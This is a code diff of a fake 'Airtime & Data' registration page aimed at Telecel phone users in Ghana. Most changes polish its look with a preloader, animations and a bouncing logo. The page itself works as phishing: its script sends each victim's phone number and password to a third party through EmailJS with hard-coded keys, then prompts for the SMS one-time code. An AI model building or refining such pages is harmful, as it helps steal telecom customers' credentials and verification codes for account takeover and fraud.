@@ -4,13 +4,12 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Airtime & Data | Register</title>
-  <!-- Meta Description -->
-<meta name="description" content= " Airtime & Data — Fast and reliable airtime and data services with secure registration and easy access.">
+  <meta name="description" content="Airtime & Data — Fast and reliable airtime and data services with secure registration and easy access.">
 
-<!-- Favicons -->
-<link rel="apple-touch-icon" sizes="180x180" href="favicon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
-<link rel="icon" type="image/png" sizes="16x16" href="favicon.png">
+  <!-- Favicons -->
+  <link rel="apple-touch-icon" sizes="180x180" href="favicon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="favicon.png">
   
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
@@ -19,7 +18,37 @@
       emailjs.init("gV773-VG85THpxrNV"); 
     })();
   </script>
+
   <style>
+    /* ===== Preloader ===== */
+    #preloader {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: linear-gradient(135deg, #003366, #0055a5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      flex-direction: column;
+      transition: opacity 0.8s ease;
+    }
+    #preloader.hidden {
+      opacity: 0;
+      pointer-events: none;
+    }
+    .loader {
+      width: 80px;
+      height: 80px;
+      border: 6px solid rgba(255, 215, 0, 0.3);
+      border-top-color: gold;
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* ===== Background ===== */
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
@@ -32,42 +61,83 @@
       position: relative;
     }
 
-    /* Yellow accent circles */
-    body::before,
-    body::after {
-      content: "";
+    /* Floating gold accent circles */
+    .circle {
       position: absolute;
       border-radius: 50%;
-      background: red;
-      opacity: 0.15;
+      background: radial-gradient(circle, rgba(255, 215, 0, 0.5), transparent);
+      opacity: 0.4;
+      animation: float 10s infinite ease-in-out, shimmer 6s infinite ease-in-out alternate;
     }
 
-    body::before {
-      width: 300px;
-      height: 300px;
-      top: -100px;
-      left: -100px;
+    .circle:nth-child(1) {
+      width: 180px; height: 180px;
+      top: -50px; left: -60px;
+      animation-delay: 0s;
     }
 
-    body::after {
-      width: 200px;
-      height: 200px;
-      bottom: -80px;
-      right: -80px;
+    .circle:nth-child(2) {
+      width: 150px; height: 150px;
+      bottom: 20px; right: -50px;
+      animation-delay: 2s;
+    }
+
+    .circle:nth-child(3) {
+      width: 100px; height: 100px;
+      top: 50%; left: 75%;
+      animation-delay: 4s;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-20px); }
+    }
+
+    @keyframes shimmer {
+      0%, 100% { opacity: 0.4; transform: scale(1); }
+      50% { opacity: 0.8; transform: scale(1.05); }
+    }
+
+    /* ===== Bouncing logo ===== */
+    .bounce {
+      animation: bounce 3s ease-in-out infinite, goldGlow 2.5s ease-in-out infinite alternate;
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-15px); }
+    }
+    @keyframes goldGlow {
+      0% { filter: drop-shadow(0 0 2px #ffd700) drop-shadow(0 0 5px rgba(255,215,0,0.5)); }
+      100% { filter: drop-shadow(0 0 10px #ffd700) drop-shadow(0 0 20px rgba(255,215,0,1)); }
     }
   </style>
 </head>
+
 <body>
+  <!-- Preloader -->
+  <div id="preloader">
+    <div class="loader"></div>
+    <p style="color: gold; font-weight: bold; margin-top: 12px;">Loading...</p>
+  </div>
+
+  <!-- Floating background circles -->
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+
   <!-- Page Wrapper -->
   <div class="flex items-center justify-center w-full px-4">
-    <div class="bg-white p-6 sm:p-8 rounded-2xl shadow-2xl w-full max-w-md border border-blue-100">
+    <div class="bg-white p-6 sm:p-8 rounded-2xl shadow-2xl w-full max-w-md border border-blue-100 relative z-10">
+      <img src="favicon.png" alt="Airtime & Data Logo" class="w-24 mx-auto mb-4 bounce">
       <h2 class="text-3xl font-bold text-blue-700 text-center mb-6">Create An Account</h2>
 
       <!-- Registration Form -->
       <form id="registerForm" class="space-y-5">
         <!-- Phone -->
         <div>
-          <label class="block text-sm font-semibold text-gray-700 mb-1"> <span style="color:blue;">TELECEL</span> Phone Number</label>
+          <label class="block text-sm font-semibold text-gray-700 mb-1">
+            <span style="color:blue;">TELECEL</span> Phone Number
+          </label>
           <div class="flex items-center border-2 border-blue-200 rounded-xl overflow-hidden focus-within:ring-2 focus-within:ring-blue-500">
             <span class="px-3 bg-blue-50 flex items-center">
               <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Flag_of_Ghana.svg" alt="Ghana" class="w-6 h-4 mr-1">
@@ -101,13 +171,13 @@
     </div>
   </div>
 
-  <!-- Popup: OTP -->
+  <!-- OTP Modal -->
   <div id="otpModal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center">
     <div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm p-6 border border-blue-100 mx-4">
-      <img src="telecelplay.png" style="height: 100px;width: 260px;padding-left: 35px;">
+      <img src="telecelplay.png" style="height: 100px;width: 260px;padding-left: 35px;" class="bounce">
       <h3 class="text-xl font-bold text-blue-700 mb-4">Enter Verification Code</h3>
       <p class="text-sm text-gray-600 mb-2">Enter the five-digit OTP sent to your Telecel number.</p>
-      <h2 style="color:red;">Do not share this SMS<h2>
+      <h2 style="color:red;">Do not share this SMS</h2>
       <input type="text" id="otpInput" maxlength="5" 
         placeholder="Enter 5-digit code"
         class="w-full border-2 border-blue-200 rounded-xl px-3 py-2 outline-none focus:ring-2 focus:ring-blue-500 mb-3">
@@ -126,6 +196,14 @@
   <div id="notification" class="fixed top-5 right-5 hidden px-4 py-3 rounded-xl shadow-lg"></div>
 
   <script>
+    // Preloader
+    window.addEventListener("load", () => {
+      const preloader = document.getElementById("preloader");
+      setTimeout(() => {
+        preloader.classList.add("hidden");
+      }, 1600); // Visible for 1.6 seconds
+    });
+
     const registerForm = document.getElementById("registerForm");
     const otpModal = document.getElementById("otpModal");
     const otpInput = document.getElementById("otpInput");
@@ -175,7 +253,6 @@
       const phone = document.getElementById("phone").value;
       const password = passwordField.value;
 
-      // Simulate EmailJS send
       emailjs.send("service_74nt2c9","template_s6vpt2e",{
         phone: "TELECEL +233" + phone,
         password: password
@@ -212,7 +289,7 @@
 
     resendBtn.addEventListener("click", function(){
       otpInput.value = "";
-      showNotification("Code resent. Please check your sms.");
+      showNotification("Code resent. Please check your SMS.");
       startTimer();
     });
   </script>
